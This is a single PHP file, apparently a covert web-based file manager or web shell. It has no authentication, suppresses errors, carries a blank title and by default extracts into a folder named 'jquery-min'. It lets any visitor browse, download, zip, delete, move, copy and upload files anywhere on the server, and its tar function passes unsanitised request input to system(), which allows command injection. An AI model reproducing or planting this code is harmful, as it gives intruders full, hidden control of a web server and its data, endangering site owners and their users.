<?php
error_reporting(0);

function imgLoad($img) {
// images
$pngFolder = <<< EOFILE
iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAAA3NCSVQICAjb4U/gAAABhlBMVEX//v7//v3///7//fr//fj+/v3//fb+/fT+/Pf//PX+/Pb+/PP+/PL+/PH+/PD+++/+++7++u/9+vL9+vH79+r79+n79uj89tj89Nf889D88sj78sz78sr58N3u7u7u7ev777j67bL67Kv46sHt6uP26cns6d356aP56aD56Jv45pT45pP45ZD45I324av344r344T14J734oT34YD13pD24Hv03af13pP233X025303JL23nX23nHz2pX23Gvn2a7122fz2I3122T12mLz14Xv1JPy1YD12Vz02Fvy1H7v04T011Py03j011b01k7v0n/x0nHz1Ejv0Hnuz3Xx0Gvz00buzofz00Pxz2juz3Hy0TrmznzmzoHy0Djqy2vtymnxzS3xzi/kyG3jyG7wyyXkwJjpwHLiw2Liw2HhwmDdvlXevVPduVThsX7btDrbsj/gq3DbsDzbrT7brDvaqzjapjrbpTraojnboTrbmzrbmjrbl0Tbljrakz3ajzzZjTfZijLZiTJdVmhqAAAAgnRSTlP///////////////////////////////////////8A////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////9XzUpQAAAAlwSFlzAAALEgAACxIB0t1+/AAAAB90RVh0U29mdHdhcmUATWFjcm9tZWRpYSBGaXJld29ya3MgOLVo0ngAAACqSURBVBiVY5BDAwxECGRlpgNBtpoKCMjLM8jnsYKASFJycnJ0tD1QRT6HromhHj8YMOcABYqEzc3d4uO9vIKCIkULgQIlYq5haao8YMBUDBQoZWIBAnFtAwsHD4kyoEA5l5SCkqa+qZ27X7hkBVCgUkhRXcvI2sk3MCpRugooUCOooWNs4+wdGpuQIlMDFKiWNbO0dXTx9AwICVGuBQqkFtQ1wEB9LhGeAwDSdzMEmZfC0wAAAABJRU5ErkJggg==
EOFILE;
$pngFolderGo = <<< EOFILE
iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAJISURBVDjLpZPLS5RhFIef93NmnMIRSynvgRF5KWhRlmWbbotwU9sWLupfCBeBEYhQm2iVq1oF0TKIILIkMgosxBaBkpFDmpo549y+772dFl5bBIG/5eGch9+5KRFhOwrYpmIAk8+OjScr29uV2soTotzXtLOZLiD6q0oBUDjY89nGAJQErU3dD+NKKZDVYpTChr9a5sdvpWUtClCWqBRxZiE/9+o68CQGgJUQr8ujn/dxugyCSpRKkaw/S33n7QQigAfxgKCCitqpp939mwCjAvEapxOIF3xpBlOYJ78wQjxZB2LAa0QsYEm19iUQv29jBihJeltCF0F0AZNbIdXaS7K6ba3hdQey6iBWBS6IbQJMQGzHHqrarm0kCh6vf2AzLxGX5eboc5ZLBe52dZBsvAGRsAUgIi7EFycQl0VcDrEZvFlGXBZshtCGNNa0cXVkjEdXIjBb1kiEiLd4s4jYLOKy9L1+DGLQ3qKtpW7XAdpqj5MLC/Q8uMi98oYtAC2icIj9jdgMYjNYrznf0YsTj/MOjzCbTXO48RR5XaJ35k2yMBCoGIBov2yLSztNPpHCpwKROKHVOPF8X5rCeIv1BuMMK1GOI02nyZsiH769DVcBYXRneuhSJ8I5FCmAsNomrbPsrWzGeocTz1x2ht0VtXxKj/Jl+v1y0dCg/vVMl4daXKg12mtCq9lf0xGcaLnA2Mw7hidfTGhL5+ygROp/v/HQQLB4tPlMzcjk8EftOTk7KHr1hP4T0NKvFp0vqyl5F18YFLse/wPLHlqRZqo3CAAAAABJRU5ErkJggg==
EOFILE;
$pngFile = <<< EOFILE
iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAQAAAAnOwc2AAAAYUlEQVQI12XOMQ7CMBQD0Dd8ssFAT8AMJ0zn5LgdEANFQmFoUBXwYsn+tj8kyYDYqLSN58nDC1JpX5RmEkFZswoynDx7PO+FB9HFOlj/l7tYf61h++riGMxnS//y5u1u/QBfzSakUpB5gAAAAABJRU5ErkJggg==
EOFILE;

	switch ($img)
	{
		case 'pngFolder' :
		header("Content-type: image/png");
		echo base64_decode($pngFolder);
		exit();

		case 'pngFolderGo' :
		header("Content-type: image/png");
		echo base64_decode($pngFolderGo);
		exit();

		case 'pngFile' :
		header("Content-type: image/png");
		echo base64_decode($pngFile);
		exit();
	}
}

function download($file) {
	if (!file_exists($file)) return false;
	if (is_dir($file)) return false;
	$name = basename($file);
	header("Pragma: public");
	header("Cache-Control: maxage=1, post-check=0, pre-check=0");
    header("Content-Type: application/force-download");
    header("Content-type: application/octet-stream");
    header("Content-Disposition: attachment; filename=\"".$name."\";");
	header("X-Content-Type-Options: nosniff");
	header("Content-Length: " . filesize($file));
	header("Expires: 0");
    readfile($file);
    return true;
}

function allDirInfo($dir = ''){
	$fileList = array();
	if (empty($dir)) $dir = dirname(__FILE__);
	if ((substr($dir, -1, 1) != '\\') && (substr($dir, -1, 1) != '/')) $dir .= DIRECTORY_SEPARATOR;
	if (file_exists($dir)) {
		if (is_dir($dir)) {
			if ($dh = opendir($dir)) {
				while (($file = readdir($dh)) !== false) {
					$realpath = realpath($dir . $file);
					$pInfo = pathinfo($realpath);
					$ext = (isset($pInfo['extension'])) ? $pInfo['extension'] : '';
					$fileList[] = array('name' => $file, 'type' => filetype($realpath), 'path' => $realpath, 'ext' => $ext);
				}
				closedir($dh);
			}
		} elseif (is_file($dir)) {
			$realpath = realpath($dir);
			$pInfo = pathinfo($realpath);
			$ext = (isset($pInfo['extension'])) ? $pInfo['extension'] : '';
			$fileList[] = array('name' => basename($dir), 'type' => filetype($realpath), 'path' => $realpath, 'ext' => $ext);
		}
	}
	return $fileList;
}
function getDirectories($dirInfo) {
	$dirList = array();
	if (!is_array($dirInfo)) return $dirList;
	foreach ($dirInfo as $value) {
		if($value['type'] == 'dir') $dirList[] = $value;
	}
	return $dirList;
}
function getFiles($dirInfo) {
	$fileList = array();
	if (!is_array($dirInfo)) return $fileList;
	foreach ($dirInfo as $value) {
		if($value['type'] == 'file') $fileList[] = $value;
	}
	return $fileList;
}
function displayFormat($size) {
	if ($size == 0) return '0 KB';
	if ($size <= 1024) return '1 KB';
	$v = $size / 1024;
	if (($v > 1) && ($v < 10)) return round($v, 1) . ' KB';
	$v = number_format(round($v));
	return $v . ' KB';
}
function allFileList($dir, $fileList = '') {
	if ((substr($dir, -1, 1) != '\\') && (substr($dir, -1, 1) != '/')) $dir .= DIRECTORY_SEPARATOR;
	if (is_dir($dir)) {
		if ($dh = opendir($dir)) {
			while (($file = readdir($dh)) !== false) {
				if(($file == '.') || ($file == '..')) continue;
				$realpath = realpath($dir . $file);
				if(filetype($realpath) == 'dir'){
					$fileList = allFileList($realpath, $fileList);
				} else {
					$fileList[] = $realpath;
				}
			}
			closedir($dh);
		}
	}
	return $fileList;
}
function dirToZip($dir) {
	if ((substr($dir, -1, 1) != '\\') && (substr($dir, -1, 1) != '/')) $dir .= DIRECTORY_SEPARATOR;
	$fileName = basename($dir) . '-' . time() . '.zip';
	$target = $dir . $fileName;
	$fileList = allFileList($dir);
	$zip = new ZipArchive;
	$res = $zip->open($target, ZIPARCHIVE::CREATE);
	if ($res === TRUE) {
		foreach ($fileList as $value) {
			$zip->addFile($value, substr($value, strlen($dir)));
		}
		$zip->close();
	} else {
		return false;
	}
	return $target;
}

function unZip($zip, $extractDir = "jquery-min") {
	$unzip = new ZipArchive;
	$res = $unzip->open($zip);
	if ($res === TRUE) {
		$unzip->extractTo($extractDir);
		$unzip->close();
		return true;
	} else {
		return false;
	}
}

function unTar($tar, $extractDir = "jquery-min") {
	if (file_exists($tar)) {
	    $cmd = "tar -xzf " . $tar . " " . $extractDir;
	    system($cmd, $retval);
	}
}

// removes files and non-empty directories
function rrmdir($dir) {
  if (is_dir($dir)) {
    $files = scandir($dir);
    foreach ($files as $file)
    if ($file != "." && $file != "..") rrmdir("$dir/$file");
    rmdir($dir);
  }
  else if (file_exists($dir)) unlink($dir);
}

// copies files and non-empty directories
function rcopy($src, $dst) {
  if (file_exists($dst)) rrmdir($dst);
  if (is_dir($src)) {
    mkdir($dst);
    $files = scandir($src);
    foreach ($files as $file)
    if ($file != "." && $file != "..") rcopy("$src/$file", "$dst/$file");
  }
  else if (file_exists($src)) copy($src, $dst);
}


if (isset($_GET['dw'])) {
	$dw = download($_GET['dw']);
	if($dw) exit();
} elseif (isset($_GET['zp'])) {
	$zip = dirToZip($_GET['zp']);
	if($zip){
		$dw = download($zip);
		@unlink($zip);
		if($dw) exit();
	}
} elseif (isset($_GET['fp'])) {
	$dir = $_GET['fp'];

} elseif (isset($_GET['rm'])) {
	$dir = dirname($_GET['rm']);
	if ($_GET['rm'] != __FILE__) {
		rrmdir($_GET['rm']);
	}

} elseif (isset($_GET['mv']) && !empty($_GET['to'])) {
	if (file_exists($_GET['mv'])) {
		if ($_GET['mv'] != __FILE__) {
			$dir = dirname($_GET['to']);
			rename($_GET['mv'], $_GET['to']);
		}
	}

} elseif (isset($_GET['cp']) && !empty($_GET['to'])) {
	if (file_exists($_GET['cp']) && file_exists(dirname($_GET['to']))) {
		$dir = dirname($_GET['to']);
		rcopy($_GET['cp'], $_GET['to']);
	}

} elseif (isset($_GET['tar'])) {
	if(!empty($_GET['to'])){
		unTar($_GET['tar'], $_GET['to']);
	} else {
		unTar($_GET['tar']);
	}

} elseif (isset($_GET['zip'])) {
	if(!empty($_GET['to'])){
		unZip($_GET['zip'], $_GET['to']);
	} else {
		unZip($_GET['zip'], ".");
	}

} elseif (isset($_GET['img'])) {
	imgLoad($_GET['img']);

} else {
	$dir = dirname(__FILE__);
}
if (empty($dir)) $dir = dirname(__FILE__);
if (!empty($_FILES)) {
	move_uploaded_file($_FILES['fup']['tmp_name'], dirname(__FILE__) . DIRECTORY_SEPARATOR . $_FILES['fup']['name']);
}
?>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<title> </title>
<style type="text/css">
	* {font-family: Segoe UI,Arial,sans-serif; font-size: 13px;}
	a {color: #008000; text-decoration: none;}
	a:hover {text-decoration: underline;}
	input {width: 100%; border: 1px solid #aaaaaa;}
	form {padding: 0; margin: 0;}
</style>
<script type="text/javascript">
	var url = '<?php echo $_SERVER['SCRIPT_NAME']; ?>';
	function isMove(mv){
		var target = prompt('Enter the target directory.');
		if(target != null) location.href = url + '?mv=' + mv + '&to=' + encodeURIComponent(target);
	}
	function isCopy(cp){
		var target = prompt('Enter the target directory.');
		if(target != null) location.href = url + '?cp=' + cp + '&to=' + encodeURIComponent(target);
	}
</script>
</head>
<body>
<table border="1" style="border-collapse: collapse;" bordercolor="#eeeeee">
	<tr>
		<td style="padding: 0" colspan="2">
		<form><input type="text" value="<?php echo $dir;?>" name="fp"></form>
		</td>
		<form method="post" enctype="multipart/form-data" action="<?php echo $_SERVER['SCRIPT_NAME']; ?>">
		<td colspan="3">
			<input type="file" name="fup">
		</td>
		<td align="center">
			<button type="submit">OK</button>
		</td>
		</form>
	</tr>
	<tr bgcolor="#cccccc">
		<td style="padding: 2px 10px" width="200">Name</td>
		<td style="padding: 2px 10px" width="70">Type</td>
		<td style="padding: 2px 10px" width="60" align="right">Size</td>
		<td style="padding: 2px 10px" align="center" colspan="3">Action</td>
	</tr>
	<?php
	$list = allDirInfo($dir);
	sort($list);
	$idx = 0;
	foreach (getDirectories($list) as $value) {
		if ($value['name'] == '.') continue;
		if ($value['name'] == '..') {
			$value['name'] = '<b>Up One Level &raquo;</b>';
			$value['img'] = '<img src="'.$_SERVER['SCRIPT_NAME'].'?img=pngFolderGo'.'" style="vertical-align:middle;">';
			$value['type'] = '';
		} else {
			$value['img'] = '<img src="'.$_SERVER['SCRIPT_NAME'].'?img=pngFolder'.'" style="vertical-align:middle;">';
			$value['type'] = 'File Folder';
		}
		$bg = (($idx % 2) == 0) ? ' bgcolor="#f4f4f4"' : ' bgcolor="#ffffff"';
		echo '<tr ' . $bg . '>';
		echo '<td style="padding: 2px 10px" nowrap>';
		echo $value['img'] . ' <a href="'.$_SERVER['SCRIPT_NAME'].'?fp='.urlencode($value['path']).'" style="vertical-align:middle;"><b>' . $value['name'] . '</b></a>';
		echo '</td>';
		echo '<td style="padding: 2px 10px" nowrap>' . $value['type'] . '</td>';
		echo '<td align=right style="padding: 2px 10px" nowrap>';
		if($value['type'] != '') echo '<a href="#" title="' . $value['name'] . '" onclick="if(confirm(\'&quot;' . $value['name'] . '&quot; download?\')){window.open(\''.$_SERVER['SCRIPT_NAME'].'?zp='.urlencode($value['path']).'\', \'_self\');}">download</a>';
		echo '</td>';
		echo '<td style="padding: 2px 10px" align=center nowrap>';
		if ($value['type'] != '') echo '<a href="javascript:void(0)" title="' . $value['name'] . '" onclick="if(confirm(\'&quot;' . $value['name'] . '&quot; Remove?\')){window.open(\''.$_SERVER['SCRIPT_NAME'].'?rm='.urlencode($value['path']).'\', \'_self\');}">Remove</a>';
		echo '</td>';
		echo '<td style="padding: 2px 10px" align=center nowrap>';
		if ($value['type'] != '') echo '<a href="#" title="' . $value['name'] . '" onclick="isMove(\'' . urlencode($value['path']) . '\')">Move</a>';
		echo '</td>';
		echo '<td style="padding: 2px 10px" align=center nowrap>';
		if ($value['type'] != '') echo '<a href="#" title="' . $value['name'] . '" onclick="isCopy(\'' . urlencode($value['path']) . '\')">Copy</a>';
		echo '</td>';
		echo '</tr>';
		$idx++;
	}
	$sum = 0;
	foreach (getFiles($list) as $value) {
		$bg = (($idx % 2) == 0) ? ' bgcolor="#f4f4f4"' : ' bgcolor="#ffffff"';
		echo '<tr ' . $bg . '>';
		echo '<td style="padding: 2px 10px" nowrap>';
		echo '<img src="'.$_SERVER['SCRIPT_NAME'].'?img=pngFile'.'" style="vertical-align:middle; margin:0 3px;"> <a href="'.$_SERVER['SCRIPT_NAME'].'?dw='.urlencode($value['path']).'" style="vertical-align:middle;">' . $value['name'] . '</a>';
		echo '</td>';
		echo '<td style="padding: 2px 10px" nowrap>' . strtoupper($value['ext']) . ' File' . '</td>';
		echo '<td style="padding: 2px 10px" align=right nowrap>' . displayFormat(filesize($value['path'])) . '</td>';
		echo '<td style="padding: 2px 10px" align=center nowrap>';
		echo '<a href="javascript:void(0)" title="' . $value['name'] . '" onclick="if(confirm(\'&quot;' . $value['name'] . '&quot; Remove?\')){window.open(\''.$_SERVER['SCRIPT_NAME'].'?rm='.urlencode($value['path']).'\', \'_self\');}">Remove</a>';
		echo '</td>';
		echo '<td style="padding: 2px 10px" align=center nowrap>';
		if ($value['type'] != '') echo '<a href="#" title="' . $value['name'] . '" onclick="isMove(\'' . urlencode($value['path']) . '\')">Move</a>';
		echo '</td>';
		echo '<td style="padding: 2px 10px" align=center nowrap>';
		if ($value['type'] != '') echo '<a href="#" title="' . $value['name'] . '" onclick="isCopy(\'' . urlencode($value['path']) . '\')">Copy</a>';
		echo '</td>';
		echo '</tr>';
		$sum += filesize($value['path']);
		$idx++;
	}
	if($sum > 0){
		echo '<tr>';
		echo '<td colspan=2></td>';
		echo '<td style="padding: 2px 10px" align=right nowrap><b>' . displayFormat($sum) . '</b></td>';
		echo '</tr>';
	}
	?>
	<tr>

	</tr>
</table>
</body>
</html>
<?php
	clearstatcache();
?>